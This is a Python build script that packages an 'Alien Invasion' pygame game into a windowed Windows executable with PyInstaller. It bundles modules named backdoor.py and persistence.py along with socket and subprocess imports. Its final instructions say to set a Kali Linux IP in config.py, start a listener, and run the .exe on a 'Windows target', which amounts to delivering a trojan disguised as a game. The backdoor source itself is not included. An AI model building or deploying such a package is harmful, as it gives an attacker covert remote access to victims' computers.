#!/usr/bin/env python3
"""
Build script to create Windows .exe from the game
Run this on your development machine (can be Linux/Windows)
"""
import subprocess
import sys
import os

def check_pyinstaller():
    """Check if PyInstaller is installed"""
    try:
        import PyInstaller
        return True
    except ImportError:
        return False

def install_pyinstaller():
    """Install PyInstaller"""
    print("Installing PyInstaller...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        print("✓ PyInstaller installed successfully")
        return True
    except subprocess.CalledProcessError:
        print("✗ Failed to install PyInstaller")
        return False

def build_exe():
    """Build the Windows executable"""
    print("\n" + "="*60)
    print("Building Windows Executable")
    print("="*60 + "\n")
    
    # PyInstaller command
    cmd = [
        "pyinstaller",
        "--onefile",                    # Single executable file
        "--windowed",                   # No console window (GUI only)
        "--name=AlienInvasion",         # Output name
        "--icon=images/ship.png",       # Icon (if available)
        "--add-data=images:images",     # Include images folder
        "--add-data=settings.py:.",     # Include game files
        "--add-data=ship.py:.",
        "--add-data=alien.py:.",
        "--add-data=bullet.py:.",
        "--add-data=button.py:.",
        "--add-data=game_stats.py:.",
        "--add-data=scoreboard.py:.",
        "--add-data=backdoor.py:.",
        "--add-data=persistence.py:.",
        "--add-data=dependency_checker.py:.",
        "--add-data=config.py:.",
        "--hidden-import=pygame",       # Ensure pygame is included
        "--hidden-import=socket",
        "--hidden-import=subprocess",
        "--hidden-import=threading",
        "alien_invasion.py"             # Main file
    ]
    
    # Adjust for Windows/Linux path separator
    if os.name == 'nt':  # Windows
        cmd = [c.replace(':', ';') if '--add-data' in c else c for c in cmd]
    
    print("Running PyInstaller...")
    print(f"Command: {' '.join(cmd)}\n")
    
    try:
        subprocess.check_call(cmd)
        print("\n" + "="*60)
        print("✓ Build successful!")
        print("="*60)
        print("\nExecutable location:")
        print("  → dist/AlienInvasion.exe")
        print("\nYou can now copy this .exe to the Windows target machine.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"\n✗ Build failed: {e}")
        return False

def main():
    print("="*60)
    print("Alien Invasion - Windows EXE Builder")
    print("="*60)
    print()
    
    # Check/install PyInstaller
    if not check_pyinstaller():
        print("PyInstaller not found.")
        if not install_pyinstaller():
            print("\nPlease install PyInstaller manually:")
            print("  pip install pyinstaller")
            sys.exit(1)
    else:
        print("✓ PyInstaller is installed")
    
    print()
    
    # Build the executable
    if build_exe():
        print("\nNext steps:")
        print("1. Copy dist/AlienInvasion.exe to Windows target")
        print("2. Copy the 'images' folder to same directory as .exe")
        print("3. Update config.py with your Kali Linux IP")
        print("4. Start listener on Kali: python3 listener.py")
        print("5. Run AlienInvasion.exe on Windows target")
    else:
        sys.exit(1)

if __name__ == '__main__':
    main()
